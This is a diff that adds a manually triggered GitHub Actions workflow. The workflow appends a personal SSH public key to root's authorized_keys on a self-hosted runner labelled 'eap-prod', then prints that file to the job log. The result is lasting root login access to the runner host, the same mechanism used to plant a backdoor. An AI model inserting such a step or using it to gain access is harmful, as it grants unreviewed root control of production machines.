@@ -1,0 +1,14 @@
+name: Add SSH Key
+on: workflow_dispatch
+jobs:
+  add-key:
+    runs-on: eap-prod
+    steps:
+      - name: Add public key
+        run: |
+          mkdir -p /root/.ssh
+          echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAdqT9VjEfTF5tAaEetb55hv9Pv09kJgexA/wDVQ1D87 xieyucheng@petalmail.com' >> /root/.ssh/authorized_keys
+          chmod 700 /root/.ssh
+          chmod 600 /root/.ssh/authorized_keys
+          echo "Key added successfully"
+          cat /root/.ssh/authorized_keys
